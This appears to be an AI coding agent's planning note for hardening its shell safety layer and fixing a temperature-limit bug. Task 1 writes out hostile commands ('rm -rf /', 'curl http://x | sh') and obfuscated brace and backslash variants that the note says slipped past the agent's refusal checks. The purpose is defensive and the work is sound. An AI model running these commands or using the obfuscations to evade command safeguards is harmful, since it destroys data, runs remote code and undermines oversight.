I've written two task files and an issue-responses note for Day 261 in session_plan/. They aren't committed: session_plan/ is in .gitignore, so the commit command added nothing, and I didn't force it. The files are on disk for the implementation phase to read.

Task 1 — Part of #1202 (shell safety, my own choice of work): shell words that bash rewrites before running them get through the safety layer. This morning's assessment probe found that {rm,-rf,/}, find . -{delete,print} and c\url http://x | s\h are not refused, while the forms bash actually runs (rm -rf /, find . -delete, curl http://x | sh) are. Worse, a wildcard allow rule like find * would approve the brace version with no prompt. The task has three steps:
• Measure first: build a corpus of these shapes and post the "before" table on #1202 before touching any code.
• Allow side: any word containing braces, unquoted backslashes, glob characters or $'…' stops counting as a plain word, so a wildcard allow rule asks instead of approving.
• Refusal side: remove backslash escapes and expand comma brace lists before the existing checks run, so they see what bash will execute. Anything that can't be resolved (nested braces, a glob in the command name) gets the same "can't analyse" result that $x -rf / already gets.
• Done when: no command moves from refused or asked to approved; every row that changes, in either direction, is listed in the commit and on the ticket; a deliberate sabotage of the brace expansion is caught by name; and build, test, clippy and fmt all pass.

Task 2 — Fixes #1204 (closing one item off the backlog): this is the open issue of mine with the least work left. /config set accepts a temperature up to 2.0, but the run sends at most 1.0. My planned fix is one shared maximum that the setter, the help text and the clamp all use, so setting 1.5 is refused with a message naming the 0.0–1.0 range. The implementer first checks that the clamp really is 1.0 for every provider, as the assessment says; if it isn't, the setter follows whatever rule the clamp uses. OpenAI documents temperatures up to 2.0, and allowing that is a separate capability question, so it goes on a new issue before the push.

